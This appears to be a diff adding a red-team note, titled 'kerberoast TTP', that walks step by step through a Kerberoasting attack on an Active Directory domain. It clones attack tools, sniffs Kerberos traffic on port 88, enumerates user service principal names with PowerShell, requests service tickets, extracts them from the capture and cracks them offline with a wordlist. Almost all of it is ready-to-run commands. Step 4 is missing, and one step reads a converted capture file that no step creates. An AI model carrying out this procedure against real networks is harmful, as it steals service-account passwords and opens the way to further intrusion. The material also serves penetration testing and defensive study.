@@ -1,0 +1,38 @@
+# kerberoast TTP
+# https://adsecurity.org/?p=2293
+
+#requirements
+Windows Host connected to the domain
+Kali VM running on the host with the network card in bridge mode, or wireshark on the windows host.
+
+Download the kerberoast python scripts to your Kali VM
+git clone https://github.com/nidem/kerberoast.git
+cd kerberoast/
+
+Download the 
+https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Find-PSServiceAccounts
+
+1. Start tcpdump on the Kali image sniffing for kerberos ticket exchanges
+tshark -n -w kerberos.pcap -F libpcap -f 'port 88'
+
+2. Get a list of all SPNs associated with user accounts
+$SPN = Get-ADObject -LDAPFilter "(&(objectClass=user)(objectCategory=person)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=262144))" -Properties * | foreach {$_.serviceprincipalname}
+
+Or https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1
+
+3. Request TGS tickets for each of the SPNs
+Add-Type -AssemblyName system.identitymodel
+foreach($service in $SPN){
+    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $service}
+
+5. Dump a listing of the tickets out to a file to figure out the successes
+tshark -n -r kerberos.pcap -Y 'kerberos.tgs_rep_element' -T fields -e kerberos.KerberosString | nl > ticketlist.txt
+
+6. Run the extracttgsrepfrompcap.py script to get the tickets out and dumped to a file.
+python extracttgsrepfrompcap.py -f kerberos_converted.pcap -w tickets
+
+7. run the tgsrepcrack.py script to attempt to crack the tickets using a wordlist
+python ../tgsrepcrack.py dictionary.txt tickets 
+
+8. If any of them are cracked you can check against the ticketlist.txt file you created to get the account name.
+
